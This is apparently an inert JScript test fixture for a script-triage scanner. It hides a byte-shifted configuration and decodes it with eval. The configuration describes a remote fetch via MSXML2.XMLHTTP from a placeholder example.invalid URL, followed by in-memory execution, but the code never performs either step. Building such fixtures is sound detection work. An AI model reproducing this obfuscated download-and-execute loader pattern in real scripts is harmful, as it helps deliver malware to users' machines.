// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_a9272677 = function decode_a9272677_body(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push((v_a19c[i] - 27 + 256) % 256); }
  return v_b27e;
};
var recover_b549a4ec = function recover_b549a4ec_body() {
  // configuration reconstruction
  var firstPart = [150,61,142,143,128,139,142,61,85,118,61,124,126,140,144,132,141,128,122,141,128,136,138,143,128,61,71,61,127,132,142,139,124,143,126,131,122,136,128,136,138,141,148,61,120,71,61,124,127,124,139,143,128,141,61,85,61,104,132,126,141,138,142,138,129,143,73,115,104,103,99,111,111,107,61,71,61,145,124,135,144,128,142,61,85,150,61,126,124,136,139,124,132,130,137,122,132,127,61,85,61,126,124,136,139,124,132,130,137,72,82,126,77,79,84,126];
  var secondPart = [80,83,84,124,61,71,61,144,141,135,61,85,61,131,143,143,139,142,85,74,74,82,126,77,79,84,126,80,83,84,124,73,128,147,124,136,139,135,128,73,132,137,145,124,135,132,127,74,78,79,127,83,83,126,79,125,73,127,124,143,61,71,61,144,142,128,141,122,124,130,128,137,143,61,85,61,99,144,137,143,141,128,142,142,103,124,125,74,82,126,77,79,84,126,80,83,84,124,61,152,71,61,142,143,124,130,128,94,138,144,137,143,61,85,77,152];
  var v_a19c = firstPart.concat(secondPart);
  var v_f602 = (2 > 1) ? "left" : "right";
  var v_b27e = [];
  var pass = 0;
  while (pass < 1) { v_b27e = decode_a9272677.apply(null, [v_a19c]); pass++; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
  // end reconstruction
};
var inspect_4cc86c91 = function inspect_4cc86c91_body() {
  var v_d41a = eval("(" + recover_b549a4ec.apply(null, []) + ")");
  var v_e598 = new Object();
  v_e598["steps"] = v_d41a["steps"];
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598["values"] = v_d41a["values"];
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
};
